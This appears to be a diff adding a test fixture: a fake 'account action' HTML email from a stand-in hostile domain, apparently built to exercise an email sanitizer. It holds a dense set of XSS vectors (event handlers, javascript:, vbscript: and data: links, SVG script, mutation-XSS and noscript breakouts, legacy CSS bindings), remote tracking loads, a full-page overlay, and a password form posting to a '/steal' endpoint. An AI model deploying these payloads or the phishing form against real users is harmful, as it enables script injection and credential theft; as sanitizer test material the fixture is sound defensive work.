@@ -1,0 +1,43 @@
+From: "Account Team" <security@hostile.example.test>
+To: alice@test.test
+Subject: Action needed on your account
+Date: Mon, 23 Nov 2026 03:00:00 +0000
+Message-ID: <hostile-1@hostile.example.test>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head>
+<base href="https://hostile.example.test/">
+<meta http-equiv="refresh" content="0;url=https://hostile.example.test/landing">
+<link rel="stylesheet" href="https://hostile.example.test/style.css">
+<style>
+@import url(https://hostile.example.test/imported.css);
+@font-face { font-family: Spy; src: url(https://hostile.example.test/font.woff); }
+.trap { background: url('https://hostile.example.test/bg.png?who=alice'); }
+.cover { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 2147483647; background: #fff; }
+.x { width: expression(alert(1)); behavior: url(x.htc); -moz-binding: url(x.xml#xss); }
+</style>
+<script>parent.postMessage({ hijack: true }, "*")</script>
+</head>
+<body onload="alert('onload')">
+<div class="cover">Your session expired. Sign in below.</div>
+<p class="trap">Please confirm your details.</p>
+<form action="https://hostile.example.test/steal" method="post"><input name="password" type="password"><button>Sign in</button></form>
+<a href="javascript:alert('js-link')">Confirm with JavaScript</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Confirm with data</a>
+<a href="vbscript:msgbox(1)">Confirm with vbscript</a>
+<a href="https://hostile.example.test/confirm" onclick="alert('click')" target="_top">Confirm here</a>
+<img src="x" onerror="alert('onerror')">
+<img src="https://hostile.example.test/pic.png" srcset="https://hostile.example.test/pic2x.png 2x">
+<svg><script>alert('svg')</script><a xlink:href="javascript:alert('svg-link')"><text>svg link</text></a></svg>
+<math><mtext><table><mglyph><style><img src=x onerror=alert('mxss')></style></mglyph></table></mtext></math>
+<iframe src="https://hostile.example.test/frame"></iframe>
+<object data="https://hostile.example.test/obj"></object>
+<embed src="https://hostile.example.test/embed">
+<video src="https://hostile.example.test/v.mp4" poster="https://hostile.example.test/poster.png"></video>
+<table background="https://hostile.example.test/tablebg.png"><tr><td style="background-image:url(https://hostile.example.test/tdbg.png)">cell</td></tr></table>
+<p style="color:red; background:url(&quot;https://hostile.example.test/inline.png&quot;)">styled</p>
+<div style="width:100px;height:100px;position:fixed;top:0">fixed</div>
+<template><img src=x onerror=alert('template')></template>
+<noscript><p title="</noscript><img src=x onerror=alert('noscript')>"></noscript>
+</body></html>
